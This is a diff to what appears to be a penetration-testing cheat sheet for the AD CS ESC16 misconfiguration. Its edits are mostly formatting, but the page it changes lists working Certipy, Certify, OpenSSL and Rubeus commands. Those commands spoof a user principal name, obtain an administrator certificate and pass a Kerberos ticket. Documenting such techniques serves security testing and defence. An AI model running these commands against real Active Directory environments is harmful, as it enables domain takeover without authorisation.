@@ -19,15 +19,18 @@ Security Extension Disabled Globally on the CA (No Security Extension - CA-wide,
 
 ## Enumerate
 
+{% code lineNumbers="true" %}
 ```bash
 certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
 ## Certipy flags ESC16 when the CA-wide DisableExtensionList suppresses the security extension
 ```
+{% endcode %}
 
 ## Exploit
 
 {% tabs %}
 {% tab title="Certipy" %}
+{% code lineNumbers="true" %}
 ```bash
 ## Identical UPN-spoof pattern to ESC9, but any Client-Auth template on this CA is exploitable
 certipy account update -u <user>@<domain> -p <password> -dc-ip <DC-IP> -user <controlled-account> -upn administrator
@@ -35,9 +38,11 @@ certipy req -u <controlled-account>@<domain> -p <password> -ca <CA-Name> -templa
 certipy account update -u <user>@<domain> -p <password> -dc-ip <DC-IP> -user <controlled-account> -upn <controlled-account>@<domain>
 certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
 ```
+{% endcode %}
 {% endtab %}
 
-{% tab title="PowerShell/RSAT + Certify + Rubeus" %}
+{% tab title="PowerShell/RSAT + Certify + Rubeus + Openssl" %}
+{% code lineNumbers="true" %}
 ```powershell
 Set-ADUser -Identity <controlled-account> -UserPrincipalName administrator
 Certify.exe request /ca:<CA-ServerDomain>\<CA-Username> /template:<any-client-auth-template>
@@ -45,6 +50,7 @@ Set-ADUser -Identity <controlled-account> -UserPrincipalName <controlled-account
 openssl.exe pkcs12 -in esc16.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc16.pfx
 Rubeus.exe asktgt /user:administrator /certificate:esc16.pfx /ptt
 ```
+{% endcode %}
 {% endtab %}
 {% endtabs %}
 
